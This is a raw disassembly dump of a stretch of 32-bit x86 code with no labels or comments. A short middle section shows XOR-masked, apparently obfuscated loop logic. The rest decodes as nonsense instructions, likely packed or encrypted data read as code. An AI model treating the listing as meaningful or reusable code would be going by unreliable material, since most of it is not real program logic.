  41f855:	test   DWORD PTR [ecx-0x6eeb206d],0x6aa312f1
  41f85f:	mov    ebx,0x553dc68e
  41f864:	lods   eax,DWORD PTR fs:[esi]
  41f866:	js     0x41f831
  41f868:	in     al,dx
  41f869:	ret    
  41f86a:	sbb    al,0x6f
  41f86c:	mov    esp,0xe7f497bc
  41f871:	add    BYTE PTR [eax+0x3d],al
  41f874:	xchg   DWORD PTR [edi-0x70],edx
  41f877:	adc    eax,0xfbdbc03c
  41f87c:	das    
  41f87d:	jle    0x41f8aa
  41f87f:	jmp    0x2566:0x32b1f783
  41f886:	js     0x41f80a
  41f888:	aam    0xb0
  41f88a:	and    eax,0xe87b632d
  41f88f:	inc    DWORD PTR [edi+0x7e34ae38]
  41f895:	cmp    BYTE PTR [esi+ebx*2],bh
  41f898:	shr    DWORD PTR [ecx],1
  41f89a:	std    
  41f89b:	sub    BYTE PTR [ebx+0x5c24a814],bl
  41f8a1:	mov    edx,DWORD PTR [ebp+0x8]
  41f8a4:	mov    ebx,DWORD PTR [ebp-0x50]
  41f8a7:	add    edx,ecx
  41f8a9:	xor    edx,ebx
  41f8ab:	mov    DWORD PTR [ebp-0x50],edx
  41f8ae:	mov    edx,DWORD PTR [ebp+0x8]
  41f8b1:	mov    ebx,DWORD PTR [ebp-0x4c]
  41f8b4:	add    edx,edi
  41f8b6:	and    edx,ebx
  41f8b8:	mov    DWORD PTR [ebp-0x4c],edx
  41f8bb:	mov    edx,DWORD PTR [ebp+0x8]
  41f8be:	mov    ebx,DWORD PTR [ebp-0x48]
  41f8c1:	lea    edx,[ebx+edx*1+0x241fcdf]
  41f8c8:	mov    DWORD PTR [ebp-0x48],edx
  41f8cb:	mov    edx,DWORD PTR [ebp+0x8]
  41f8ce:	mov    ebx,0xfa5e1524
  41f8d3:	sub    ebx,edx
  41f8d5:	add    ebx,DWORD PTR [ebp-0x44]
  41f8d8:	mov    DWORD PTR [ebp-0x44],ebx
  41f8db:	mov    edx,DWORD PTR [ebp+0x8]
  41f8de:	xor    edx,eax
  41f8e0:	add    edx,esi
  41f8e2:	jne    0x41d4a1
  41f8e8:	mov    edx,DWORD PTR [ebp-0xc]
  41f8eb:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41f8f2:	mov    bl,BYTE PTR [ebp-0x1]
  41f8f5:	cmp    dl,bl
  41f8f7:	je     0x41f9d5
  41f8fd:	mov    ecx,DWORD PTR [ebp-0x5c]
  41f900:	mov    edx,DWORD PTR [ebp-0xc]
  41f903:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41f90a:	mov    ebx,DWORD PTR [ebp+0xc]
  41f90d:	xor    ecx,eax
  41f90f:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f1]
  41f916:	jne    0x421e61
  41f91c:	mov    ecx,DWORD PTR [ebp-0x5c]
  41f91f:	mov    edx,DWORD PTR [ebp+0xc]
  41f922:	xor    ecx,eax
  41f924:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f1]
  41f92c:	mov    edx,DWORD PTR [ebp-0x18]
  41f92f:	xor    edx,eax
  41f931:	add    edx,esi
  41f933:	cmp    ecx,edx
  41f935:	mov    ecx,DWORD PTR [ebp-0x14]
  41f938:	mov    DWORD PTR [ebp+0x8],ecx
  41f93b:	mov    ecx,DWORD PTR [ebp+0x8]
  41f93e:	je     0x423145
  41f944:	xor    ecx,eax
  41f946:	add    ecx,esi
  41f948:	mov    ecx,0x242ebc9
  41f94d:	je     0x41fa5d
  41f953:	mov    edx,DWORD PTR [ebp+0x8]
  41f956:	mov    ebx,DWORD PTR [ebp-0x8]
  41f959:	xor    edx,eax
  41f95b:	xor    ebx,eax
  41f95d:	sub    edx,ebx
  41f95f:	sub    edx,esi
  41f961:	xor    edx,eax
  41f963:	mov    DWORD PTR [ebp+0x8],edx
  41f966:	mov    edx,DWORD PTR [ebp+0x8]
  41f969:	mov    ebx,DWORD PTR [ebp-0x58]
  41f96c:	add    edx,0x5708fa
  41f972:	imul   edx,ebx
  41f975:	mov    DWORD PTR [ebp-0x58],edx
  41f978:	mov    edx,DWORD PTR [ebp+0x8]
  41f97b:	mov    ebx,DWORD PTR [ebp-0x54]
  41f97e:	add    edx,0x64f898
  41f984:	or     edx,ebx
  41f986:	mov    DWORD PTR [ebp-0x54],edx
  41f989:	mov    edx,DWORD PTR [ebp+0x8]
  41f98c:	mov    ebx,DWORD PTR [ebp-0x50]
  41f98f:	add    edx,ecx
  41f991:	xor    edx,ebx
  41f993:	mov    DWORD PTR [ebp-0x50],edx
  41f996:	mov    edx,DWORD PTR [ebp+0x8]
  41f999:	mov    ebx,DWORD PTR [ebp-0x4c]
  41f99c:	add    edx,edi
  41f99e:	and    edx,ebx
  41f9a0:	mov    DWORD PTR [ebp-0x4c],edx
  41f9a3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9a6:	mov    ebx,DWORD PTR [ebp-0x48]
  41f9a9:	lea    edx,[ebx+edx*1+0x241fcdf]
  41f9b0:	mov    DWORD PTR [ebp-0x48],edx
  41f9b3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9b6:	mov    ebx,0xfa5e1524
  41f9bb:	sub    ebx,edx
  41f9bd:	add    ebx,DWORD PTR [ebp-0x44]
  41f9c0:	mov    DWORD PTR [ebp-0x44],ebx
  41f9c3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9c6:	xor    edx,eax
  41f9c8:	add    edx,esi
  41f9ca:	jne    0x41f953
  41f9d0:	jmp    0x41fa5d
  41f9d5:	mov    edx,DWORD PTR [ebp-0x14]
  41f9d8:	mov    DWORD PTR [ebp+0x8],edx
  41f9db:	jmp    0x41fa50
  41f9e0:	mov    edx,DWORD PTR [ebp+0x8]
  41f9e3:	mov    ebx,DWORD PTR [ebp-0x8]
  41f9e6:	xor    edx,eax
  41f9e8:	xor    ebx,eax
  41f9ea:	sub    edx,ebx
  41f9ec:	sub    edx,esi
  41f9ee:	xor    edx,eax
  41f9f0:	mov    DWORD PTR [ebp+0x8],edx
  41f9f3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9f6:	mov    ebx,DWORD PTR [ebp-0x58]
  41f9f9:	add    edx,0x5708fa
  41f9ff:	imul   edx,ebx
  41fa02:	mov    DWORD PTR [ebp-0x58],edx
  41fa05:	mov    edx,DWORD PTR [ebp+0x8]
  41fa08:	mov    ebx,DWORD PTR [ebp-0x54]
  41fa0b:	add    edx,0x64f898
  41fa11:	or     edx,ebx
  41fa13:	mov    DWORD PTR [ebp-0x54],edx
  41fa16:	mov    edx,DWORD PTR [ebp+0x8]
  41fa19:	mov    ebx,DWORD PTR [ebp-0x50]
  41fa1c:	add    edx,ecx
  41fa1e:	xor    edx,ebx
  41fa20:	mov    DWORD PTR [ebp-0x50],edx
  41fa23:	mov    edx,DWORD PTR [ebp+0x8]
  41fa26:	mov    ebx,DWORD PTR [ebp-0x4c]
  41fa29:	add    edx,edi
  41fa2b:	and    edx,ebx
  41fa2d:	mov    DWORD PTR [ebp-0x4c],edx
  41fa30:	mov    edx,DWORD PTR [ebp+0x8]
  41fa33:	mov    ebx,DWORD PTR [ebp-0x48]
  41fa36:	lea    edx,[ebx+edx*1+0x241fcdf]
  41fa3d:	mov    DWORD PTR [ebp-0x48],edx
  41fa40:	mov    edx,DWORD PTR [ebp+0x8]
  41fa43:	mov    ebx,0xfa5e1524
  41fa48:	sub    ebx,edx
  41fa4a:	add    ebx,DWORD PTR [ebp-0x44]
  41fa4d:	mov    DWORD PTR [ebp-0x44],ebx
  41fa50:	mov    edx,DWORD PTR [ebp+0x8]
  41fa53:	xor    edx,eax
  41fa55:	add    edx,esi
  41fa57:	jne    0x41f9e0
  41fa5d:	mov    edx,DWORD PTR [ebp-0x14]
  41fa60:	mov    DWORD PTR [ebp+0x8],edx
  41fa63:	jmp    0x41fad8
  41fa68:	mov    edx,DWORD PTR [ebp+0x8]
  41fa6b:	mov    ebx,DWORD PTR [ebp-0x8]
  41fa6e:	xor    edx,eax
  41fa70:	xor    ebx,eax
  41fa72:	sub    edx,ebx
  41fa74:	sub    edx,esi
  41fa76:	xor    edx,eax
  41fa78:	mov    DWORD PTR [ebp+0x8],edx
  41fa7b:	mov    edx,DWORD PTR [ebp+0x8]
  41fa7e:	mov    ebx,DWORD PTR [ebp-0x58]
  41fa81:	add    edx,0x5708fa
  41fa87:	imul   edx,ebx
  41fa8a:	mov    DWORD PTR [ebp-0x58],edx
  41fa8d:	mov    edx,DWORD PTR [ebp+0x8]
  41fa90:	mov    ebx,DWORD PTR [ebp-0x54]
  41fa93:	add    edx,0x64f898
  41fa99:	or     edx,ebx
  41fa9b:	mov    DWORD PTR [ebp-0x54],edx
  41fa9e:	mov    edx,DWORD PTR [ebp+0x8]
  41faa1:	mov    ebx,DWORD PTR [ebp-0x50]
  41faa4:	add    edx,ecx
  41faa6:	xor    edx,ebx
  41faa8:	mov    DWORD PTR [ebp-0x50],edx
  41faab:	mov    edx,DWORD PTR [ebp+0x8]
  41faae:	mov    ebx,DWORD PTR [ebp-0x4c]
  41fab1:	add    edx,edi
  41fab3:	and    edx,ebx
  41fab5:	mov    DWORD PTR [ebp-0x4c],edx
  41fab8:	mov    edx,DWORD PTR [ebp+0x8]
  41fabb:	mov    ebx,DWORD PTR [ebp-0x48]
  41fabe:	lea    edx,[ebx+edx*1+0x241fcdf]
  41fac5:	mov    DWORD PTR [ebp-0x48],edx
  41fac8:	mov    edx,DWORD PTR [ebp+0x8]
  41facb:	mov    ebx,0xfa5e1524
  41fad0:	sub    ebx,edx
  41fad2:	add    ebx,DWORD PTR [ebp-0x44]
  41fad5:	mov    DWORD PTR [ebp-0x44],ebx
  41fad8:	mov    edx,DWORD PTR [ebp+0x8]
  41fadb:	xor    edx,eax
  41fadd:	add    edx,esi
  41fadf:	jne    0x41fa68
  41fae5:	mov    edx,DWORD PTR [ebp-0x8]
  41fae8:	mov    ebx,DWORD PTR [ebp-0xc]
  41faeb:	xor    edx,eax
  41faed:	lea    edx,[edx+ebx*1+0x3272f1]
  41faf4:	jmp    0x421e4c
  41faf9:	and    BYTE PTR ds:0xc10ac90f,dh
  41faff:	mov    ds:0xfe8da196,al
  41fb04:	jmp    0x565d770c
  41fb09:	adc    BYTE PTR [esi+0x5e46837c],dh
  41fb0f:	add    DWORD PTR [ebx-0x636260e3],0xffffffd7
  41fb16:	lds    eax,FWORD PTR [ebp+0x2a8cd262]
  41fb1c:	leave  
  41fb1d:	(bad)  [eax]
  41fb1f:	call   0xe1e1f18b
  41fb24:	adc    al,0xef
  41fb26:	sub    esp,DWORD PTR [ecx]
  41fb28:	cmc    
  41fb29:	jecxz  0x41fb01
  41fb2b:	fmul   QWORD PTR [esi-0x59c3ef3f]
  41fb31:	jne    0x41fb36
  41fb33:	cmp    al,0xb1
  41fb35:	shl    DWORD PTR [ebp-0x8cbf003],cl
  41fb3b:	mov    ds:0xf44d82b1,eax
  41fb40:	int3   
  41fb41:	and    DWORD PTR [ecx-0x79],ebx
  41fb44:	xor    al,0x1b
  41fb46:	push   eax
  41fb47:	sar    BYTE PTR [ecx],1
  41fb49:	popf   
  41fb4a:	ret    0xdfb8
  41fb4d:	mov    dl,0xea
  41fb4f:	sub    eax,0xfe1d2978
  41fb54:	(bad)  
  41fb55:	jns    0x41fb8c
  41fb57:	jmp    FWORD PTR [ecx+0x7bdeb711]
  41fb5d:	adc    BYTE PTR [edx],ch
  41fb5f:	dec    esp
  41fb60:	dec    esp
  41fb61:	dec    eax
  41fb62:	cmp    BYTE PTR [ebx+ebx*1-0x2274dac2],al
  41fb69:	pop    ecx
  41fb6a:	arpl   ax,bp
  41fb6c:	sub    eax,0x8015d3e6
  41fb71:	and    DWORD PTR [esi],0x47
  41fb74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb75:	sbb    BYTE PTR [eax],dl
  41fb77:	out    0xa4,al
  41fb79:	fisttp WORD PTR [edi]
  41fb7b:	out    dx,al
  41fb7c:	ret    
  41fb7d:	push   ebx
  41fb7e:	sbb    BYTE PTR [esi],al
  41fb80:	fidiv  WORD PTR [esi-0x26]
  41fb83:	fiadd  WORD PTR [ecx+0x41]
  41fb86:	pop    edx
  41fb87:	push   ds
  41fb88:	ja     0x41fbb8
  41fb8a:	xor    eax,0x4f76d765
  41fb8f:	xor    dl,bh
  41fb91:	daa    
  41fb92:	jno    0x41fbc4
  41fb94:	nop
  41fb95:	mov    bh,0x25
  41fb97:	nop
  41fb98:	rol    edx,0x22
  41fb9b:	mov    esi,0x49a6a6b3
  41fba0:	pop    edi
  41fba1:	fisttp WORD PTR [ecx+eiz*4+0x54]
  41fba5:	icebp  
  41fba6:	push   es
  41fba7:	fild   WORD PTR [ebp*1+0x2bb6a226]
  41fbae:	fmul   DWORD PTR [esi]
  41fbb0:	jecxz  0x41fbf6
  41fbb2:	mov    ds:0x52257a17,eax
  41fbb7:	outs   dx,BYTE PTR ds:[esi]
  41fbb8:	mov    edx,0xfc3d8210
  41fbbd:	(bad)  
  41fbbe:	(bad)  
  41fbc0:	push   ebp
  41fbc1:	retf   
  41fbc2:	pushf  
  41fbc3:	icebp  
  41fbc4:	fldenv [ebp-0x31]
  41fbc7:	jmp    0xb7d9655b
  41fbcc:	nop
  41fbcd:	jae    0x41fb89
  41fbcf:	add    edx,DWORD PTR [ebx-0x3d]
  41fbd2:	dec    edx
  41fbd3:	mov    ah,0x7a
  41fbd5:	retf   0x2a2c
  41fbd8:	scas   eax,DWORD PTR es:[edi]
  41fbd9:	mov    ah,0x6b
  41fbdb:	or     al,0x56
  41fbdd:	and    eax,0x1315552c
  41fbe2:	ret    0x6427
  41fbe5:	popa   
  41fbe6:	scas   al,BYTE PTR es:[edi]
  41fbe7:	aaa    
  41fbe8:	adc    eax,0x2d94ae40
  41fbed:	lods   al,BYTE PTR ds:[esi]
  41fbee:	sub    BYTE PTR [ebp+0x42],ch
  41fbf1:	aaa    
  41fbf2:	mov    DWORD PTR [ebx],0x57dadd10
  41fbf8:	jle    0x41fc42
  41fbfa:	mov    bl,0x9e
  41fbfc:	mov    dh,0xcf
  41fbfe:	inc    ebx
  41fbff:	xchg   edi,eax
  41fc00:	cmp    eax,DWORD PTR [ecx]
  41fc02:	icebp  
  41fc03:	jge    0x41fb98
  41fc05:	cli    
  41fc06:	(bad)  
  41fc07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc08:	into   
  41fc09:	xlat   BYTE PTR ds:[ebx]
  41fc0a:	push   es
  41fc0b:	add    eax,0x1c801b6
  41fc10:	pushf  
  41fc11:	jns    0x41fc58
  41fc13:	or     eax,0xe2e7e57b
  41fc18:	adc    DWORD PTR [esp+eax*2],ebx
  41fc1b:	mov    ebx,0x170e138c
  41fc20:	(bad)  [ecx+ebx*8+0x5]
  41fc24:	sar    DWORD PTR [ebx-0x46],cl
  41fc27:	or     esi,DWORD PTR [ecx-0x4c74f629]
  41fc2d:	mov    dh,bh
  41fc2f:	cmp    al,0x36
  41fc31:	push   0x415ce4d7
  41fc36:	fidiv  DWORD PTR [esi-0xae71d06]
  41fc3c:	push   ecx
  41fc3d:	xchg   esp,eax
  41fc3e:	mov    eax,ds:0x21db074d
  41fc43:	dec    ebp
  41fc44:	mov    BYTE PTR [ecx],0x28
  41fc47:	cli    
  41fc48:	mov    edx,0x8ced3de2
  41fc4d:	dec    ecx
  41fc4e:	daa    
  41fc4f:	inc    edi
  41fc50:	dec    edx
  41fc51:	imul   ecx,edx
  41fc54:	and    ebp,DWORD PTR [edi-0x30]
  41fc57:	push   DWORD PTR [ebx-0x74c7c29a]
  41fc5d:	add    cl,al
  41fc5f:	fwait
  41fc60:	or     al,0x97
  41fc62:	cli    
  41fc63:	aam    0xef
  41fc65:	jae    0x41fc17
  41fc67:	outs   dx,BYTE PTR ds:[esi]
  41fc68:	xchg   ebx,eax
  41fc69:	ja     0x41fc9f
  41fc6b:	mov    ecx,0x3ca356e0
  41fc70:	mov    eax,0x5f2be71e
  41fc75:	mov    WORD PTR [ebx],ds
  41fc77:	lds    esp,FWORD PTR [esi+0x35]
  41fc7a:	shl    BYTE PTR ds:0xc7562086,cl
  41fc80:	jmp    0x5cd0:0x2144b814
  41fc87:	mov    esp,0x10cf6cc2
  41fc8c:	sub    edx,DWORD PTR [ecx]
  41fc8e:	popa   
  41fc8f:	mov    DWORD PTR [eax+0x59],ecx
  41fc92:	call   0x250656bf
  41fc97:	xor    ebx,DWORD PTR [edx]
  41fc99:	jp     0x41fcd0
  41fc9b:	cmp    BYTE PTR [ebp+0x5615096c],ah
  41fca1:	mov    WORD PTR [esi-0x3d3b78db],?
  41fca7:	pop    ebp
  41fca8:	pop    eax
  41fca9:	mov    ah,0xcf
  41fcab:	mov    ah,0xf1
  41fcad:	in     eax,dx
  41fcae:	pop    edx
  41fcaf:	xchg   edi,eax
  41fcb0:	cli    
  41fcb1:	fmul   DWORD PTR [edi-0x1b08b976]
  41fcb7:	(bad)  
  41fcb8:	xchg   ecx,eax
  41fcb9:	jns    0x41fd2e
  41fcbb:	leave  
  41fcbc:	hlt    
  41fcbd:	push   ebp
  41fcbe:	ret    0xcc6a
  41fcc1:	arpl   ax,si
  41fcc3:	xor    cl,dl
  41fcc5:	ja     0x41fcb4
  41fcc7:	cmp    dl,al
  41fcc9:	or     ah,dh
  41fccb:	pop    ecx
  41fccc:	sbb    eax,0x6e537a28
  41fcd1:	cmp    DWORD PTR [edx],edx
  41fcd3:	mov    bl,0x6a
  41fcd5:	ds push edi
  41fcd7:	shr    BYTE PTR [edx],cl
  41fcd9:	mov    cl,0x8c
  41fcdb:	pop    ss
  41fcdc:	push   ebx
  41fcdd:	in     al,dx
  41fcde:	or     dl,BYTE PTR [eax]
  41fce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fce2:	nop
  41fce3:	push   eax
  41fce4:	adc    BYTE PTR [edi-0x2280b187],0xad
  41fceb:	adc    eax,0xb529885c
  41fcf0:	or     esp,DWORD PTR [ebx+0x1c87bdf4]
  41fcf6:	sub    eax,DWORD PTR [ebp+0x6b]
  41fcf9:	popf   
  41fcfa:	xlat   BYTE PTR ds:[ebx]
  41fcfb:	rcr    BYTE PTR [edx+0x6e],1
  41fcfe:	test   DWORD PTR [ecx-0x4ac83732],0x48fe6b9a
  41fd08:	jmp    0x6149:0x525542a0
  41fd0f:	push   ds
  41fd10:	cmp    DWORD PTR ds:0x7146e04a,0xf5c2f952
  41fd1a:	loop   0x41fd81
  41fd1c:	or     BYTE PTR [edx],ah
  41fd1e:	sahf   
  41fd1f:	xor    BYTE PTR [esi],dl
  41fd21:	nop
  41fd22:	push   es
  41fd23:	mov    WORD PTR [esi-0x4c],?
  41fd26:	stos   BYTE PTR es:[edi],al
  41fd27:	test   eax,0x97dfd32b
  41fd2c:	in     al,dx
  41fd2d:	ficomp WORD PTR [eax-0x36]
  41fd30:	xchg   edi,eax
  41fd31:	ja     0x41fcf3
  41fd33:	mov    eax,0xb8ff4984
  41fd38:	es in  al,0xf3
  41fd3b:	jb     0x41fd86
  41fd3d:	push   ebp
  41fd3e:	lods   al,BYTE PTR ds:[esi]
  41fd3f:	sub    eax,0x4668ac29
  41fd44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd45:	pop    es
  41fd46:	sar    DWORD PTR [esi+eax*2-0x22f5149c],0x81
  41fd4e:	clc    
  41fd4f:	jp     0x41fd6c
  41fd51:	(bad)  
  41fd52:	repz jmp 0x69d3e1f9
  41fd58:	or     esi,DWORD PTR ds:0xfc7145e7
  41fd5e:	dec    ebx
  41fd5f:	je     0x41fd47
  41fd61:	mov    ebx,0x5fa83f40
  41fd66:	dec    ebp
  41fd67:	test   BYTE PTR [ecx],dh
  41fd69:	or     DWORD PTR [eax+0x6f],0x75
  41fd6d:	push   ss
  41fd6e:	cmp    DWORD PTR [ebp+0x67bac08c],esi
  41fd74:	mov    ds:0xeffa6afb,al
  41fd79:	cmp    BYTE PTR [esi-0x429a08e4],0x91
  41fd80:	in     al,dx
  41fd81:	fidivr DWORD PTR [edi+0x4e]
  41fd84:	adc    BYTE PTR [edx],ah
  41fd86:	nop
  41fd87:	xchg   ebp,eax
  41fd88:	out    0x4c,eax
  41fd8a:	push   edi
  41fd8b:	loopne 0x41fd73
  41fd8d:	xor    BYTE PTR [eax-0x3e23297e],ch
  41fd93:	push   0x3100cb6
  41fd98:	(bad)  
  41fd99:	mov    BYTE PTR es:[eax+esi*8+0x66ca2b17],dh
  41fda1:	sti    
  41fda2:	les    edi,FWORD PTR [eax+0x26]
  41fda5:	sub    edi,DWORD PTR [edi]
  41fda7:	mov    eax,ds:0x9f357c5f
  41fdac:	sub    eax,0x90f0b4ea
  41fdb1:	dec    esi
  41fdb2:	es retf 0xf57c
  41fdb6:	mov    dl,0x2
  41fdb8:	push   esi
  41fdb9:	inc    esp
  41fdba:	xor    al,0xdf
  41fdbc:	dec    al
  41fdbe:	pop    edi
  41fdbf:	jo     0x41fe33
  41fdc1:	fimul  WORD PTR fs:[ebx+0x48]
  41fdc5:	mov    ecx,0xc8ea5514
  41fdcb:	jmp    0xe879:0x9f2f4c5
  41fdd2:	jecxz  0x41fda6
  41fdd4:	xchg   ebp,eax
  41fdd5:	pop    ss
  41fdd6:	or     eax,0x28032fd9
  41fddb:	fdivp  st(1),st
  41fddd:	pop    ds
  41fdde:	popf   
  41fddf:	out    0x1b,eax
  41fde1:	fcomp  DWORD PTR [edi+0x307eeea0]
  41fde7:	cmp    dl,dh
  41fde9:	shl    DWORD PTR [edi+0x2ad69b2c],1
  41fdef:	stos   DWORD PTR es:[edi],eax
  41fdf0:	call   0xa7d5:0xf41e6e35
  41fdf7:	xor    BYTE PTR [edi+ecx*2-0x252d896f],al
  41fdfe:	hlt    
  41fdff:	fs inc edi
  41fe01:	cli    
  41fe02:	jge    0x41fe37
  41fe04:	repz cmp dh,BYTE PTR [ecx-0x31]
  41fe08:	out    dx,al
  41fe09:	icebp  
  41fe0a:	outs   dx,BYTE PTR ds:[esi]
  41fe0b:	dec    ecx
  41fe0c:	lds    ecx,FWORD PTR cs:[ebp+0x15]
  41fe10:	inc    esp
  41fe11:	leave  
  41fe12:	add    ebx,DWORD PTR [ebx]
  41fe14:	inc    edx
  41fe15:	out    0x2f,al
  41fe17:	push   ss
  41fe18:	in     al,0xca
  41fe1a:	dec    ebp
  41fe1b:	mov    DWORD PTR [ebp-0x1c382788],esp
  41fe21:	push   0x18ed5c1
  41fe26:	sldt   WORD PTR [esi-0x541a200f]
  41fe2d:	mov    cl,0x76
  41fe2f:	pop    ds
  41fe30:	and    al,0x8f
  41fe32:	push   0xfffffff4
  41fe34:	cmp    DWORD PTR [ebx-0x235c2acf],ecx
  41fe3a:	pop    ds
  41fe3b:	push   ecx
  41fe3c:	pop    ss
  41fe3d:	mov    dl,0xec
  41fe3f:	xchg   edi,eax
  41fe40:	mov    al,ds:0x86d4783c
  41fe45:	addr16 clc 
  41fe47:	pushf  
  41fe48:	popf   
  41fe49:	adc    edx,DWORD PTR [edx]
  41fe4b:	add    eax,0x95a695f0
  41fe50:	sbb    BYTE PTR [edx],bl
  41fe52:	jnp    0x41fe6d
  41fe54:	dec    ebp
  41fe55:	jmp    0xb4134bf2
  41fe5a:	push   esi
  41fe5b:	fistp  WORD PTR [ebx+ebx*1-0x1a]
  41fe5f:	pop    ecx
  41fe60:	push   cs
  41fe61:	sub    esp,DWORD PTR [esi+0x24bf9a8f]
  41fe67:	ins    BYTE PTR es:[edi],dx
  41fe68:	jl     0x41fdf5
  41fe6a:	inc    ecx
  41fe6b:	inc    ebp
  41fe6c:	sar    DWORD PTR [eax+ecx*4+0x5e45ae7f],cl
  41fe73:	push   ebx
  41fe74:	push   ebp
  41fe75:	mov    bh,0x84
  41fe77:	mov    BYTE PTR [esi],ch
  41fe79:	in     al,0x44
  41fe7b:	xchg   edx,edx
  41fe7d:	sbb    ch,BYTE PTR fs:[ebx+esi*2-0x57]
  41fe82:	xor    eax,0x475d699e
  41fe87:	jecxz  0x41fe3d
  41fe89:	packsswb mm2,QWORD PTR [eax+0x5b]
  41fe8d:	enter  0xb0b4,0xd3
  41fe91:	inc    esi
  41fe92:	dec    esi
  41fe93:	ds fs mov esi,0x257ba097
  41fe9a:	stc    
  41fe9b:	icebp  
  41fe9c:	sub    al,0xfe
  41fe9e:	mov    ah,0x37
  41fea0:	adc    bl,ah
  41fea2:	iret   
  41fea3:	pop    ecx
  41fea4:	dec    eax
  41fea5:	or     al,0xf3
  41fea7:	loopne 0x41fe60
  41fea9:	stos   BYTE PTR es:[edi],al
  41feaa:	popa   
  41feab:	mov    ah,0xa5
  41fead:	outs   dx,BYTE PTR ds:[esi]
  41feae:	push   ebp
  41feaf:	sub    al,0x55
  41feb1:	adc    al,0x1f
  41feb3:	in     eax,0xbe
  41feb5:	xchg   esp,eax
  41feb6:	jb     0x41fece
  41feb8:	das    
  41feb9:	jmp    0x41fe65
  41febb:	push   0x1e5c6747
  41fec0:	cmp    cl,cl
  41fec2:	pop    ds
  41fec3:	mov    ebp,0x5719b287
  41fec8:	cmp    eax,0x8f363119
  41fecd:	pushf  
  41fece:	sub    cl,BYTE PTR [eax+0x607d39c6]
  41fed4:	mov    ecx,0x5a34abc5
  41fed9:	cmp    al,BYTE PTR [ecx-0x59]
  41fedc:	inc    ecx
  41fedd:	sbb    BYTE PTR [esi-0x6d],bl
  41fee0:	pop    es
  41fee1:	pusha  
  41fee2:	mov    ebp,0x594f6dcf
  41fee7:	or     dl,bl
  41fee9:	popf   
  41feea:	inc    ebx
  41feeb:	and    edx,ecx
  41feed:	fstp   DWORD PTR [edi]
  41feef:	dec    edx
  41fef0:	les    ebx,FWORD PTR [edi+0x2f6f7dab]
  41fef6:	imul   edi,DWORD PTR [eax+ebx*1],0xffffffb2
  41fefa:	add    eax,0xc915e202
  41feff:	and    al,BYTE PTR [esi+ebx*8+0x5c]
  41ff03:	push   edi
  41ff04:	push   ds
  41ff05:	cwde   
  41ff06:	sbb    ch,al
  41ff08:	adc    DWORD PTR [edx+0x4ada97db],esp
  41ff0e:	jae    0x41ff18
  41ff10:	aaa    
  41ff11:	ja     0x41ff29
  41ff13:	push   ecx
  41ff14:	cmp    al,0x3a
  41ff16:	lock pop ebx
  41ff18:	and    dh,0x31
  41ff1b:	std    
  41ff1c:	jmp    FWORD PTR [ebx+0x19ec6c9b]
  41ff22:	sbb    ebx,DWORD PTR [ebx]
  41ff24:	xor    eax,0x6cf6af56
  41ff29:	add    cl,al
  41ff2b:	hlt    
  41ff2c:	cmp    bh,dh
  41ff2e:	xchg   edi,eax
  41ff2f:	ret    0xa7e4
  41ff32:	jae    0x41ff7b
  41ff34:	or     BYTE PTR [edx-0x34],ah
  41ff37:	sbb    BYTE PTR [ebp+0x65],ch
  41ff3a:	daa    
  41ff3b:	loopne 0x41fec8
  41ff3d:	int    0x18
  41ff3f:	xor    BYTE PTR [esi],0xae
  41ff42:	std    
  41ff43:	jge    0x41ff1c
  41ff45:	arpl   WORD PTR [esi+0x32],ax
  41ff48:	pop    eax
  41ff49:	ret    
  41ff4a:	lds    eax,FWORD PTR [esi+0x7b]
  41ff4d:	pushf  
  41ff4e:	adc    esp,0xfae645d9
  41ff54:	dec    ebp
  41ff55:	pop    esi
  41ff56:	mov    ah,0xf5
  41ff58:	xchg   BYTE PTR [ecx],ch
  41ff5a:	jg     0x41fef0
  41ff5c:	mov    ah,0xb7
  41ff5e:	hlt    
  41ff5f:	inc    esi
  41ff60:	mov    bl,0x3d
  41ff62:	shl    DWORD PTR [ebx],1
  41ff64:	pop    es
  41ff65:	in     eax,0xa
  41ff67:	jle    0x41ffb8
  41ff69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff6a:	cmp    al,0x37
  41ff6c:	stos   DWORD PTR es:[edi],eax
  41ff6d:	cmp    BYTE PTR [esi-0x411e4e84],dh
  41ff73:	dec    edi
  41ff74:	bound  ecx,QWORD PTR [edi]
  41ff76:	lea    edi,[ebp-0x2ce1a783]
  41ff7c:	sub    eax,0x7dc5d6e0
  41ff81:	repnz adc al,BYTE PTR [ecx-0xd]
  41ff85:	(bad)  
  41ff86:	fisttp WORD PTR [ecx]
  41ff88:	mov    al,0xa4
  41ff8a:	inc    eax
  41ff8b:	cmp    DWORD PTR [eax-0x6a84289c],ecx
  41ff91:	jno    0x41fff0
  41ff93:	outs   dx,BYTE PTR ds:[esi]
  41ff94:	push   0x208706de
  41ff99:	pushf  
  41ff9a:	mov    ds:0x2c018a50,al
  41ff9f:	rcr    BYTE PTR [ecx],0x82
  41ffa2:	jle    0x41fff2
  41ffa4:	aam    0xf0
  41ffa6:	mov    ebx,0x53af5299
  41ffab:	cmp    BYTE PTR [edi+0x47],ch
  41ffae:	retf   0x93a0
  41ffb1:	outs   dx,BYTE PTR ds:[esi]
  41ffb2:	push   cs
  41ffb3:	retf   
  41ffb4:	mov    edx,0x7c3262a6
  41ffb9:	hlt    
  41ffba:	nop
  41ffbb:	rol    dl,1
  41ffbd:	(bad)  
  41ffbe:	mov    cl,0xc4
  41ffc0:	and    ecx,DWORD PTR ds:[ebx+0x38]
  41ffc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffc5:	hlt    
  41ffc6:	mov    ah,0x7f
  41ffc8:	clc    
  41ffc9:	mov    ah,0x19
  41ffcb:	outs   dx,BYTE PTR ds:[esi]
  41ffcc:	outs   dx,BYTE PTR ds:[esi]
  41ffcd:	mov    dh,0xd9
  41ffcf:	add    esp,ebp
  41ffd1:	out    dx,al
